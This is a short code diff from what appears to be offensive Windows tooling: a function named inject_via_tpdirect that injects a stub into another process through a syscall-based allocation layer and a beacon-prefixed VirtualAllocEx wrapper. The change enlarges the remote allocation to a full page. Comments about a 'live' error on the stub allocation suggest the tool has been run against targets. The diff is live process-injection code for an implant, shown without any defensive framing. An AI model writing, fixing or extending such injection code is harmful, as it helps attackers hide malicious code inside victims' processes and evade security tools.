@@ -654,7 +654,9 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	/* alloc RW -> write -> flip RX: the syscall alloc layer does not take
 	 * PAGE_EXECUTE_READ at allocation time (C-25 live: gle=183 on the stub
 	 * alloc; same EC-era fix pattern) */
-	unsigned char * stub = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, sizeof(stubc),
+	/* full-page request: the syscall alloc layer randomizes bases and a
+	 * 13-byte request collides (C-25 live: gle=183 ERROR_ALREADY_EXISTS) */
+	unsigned char * stub = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x1000,
 	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (stub == NULL) {
 		spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
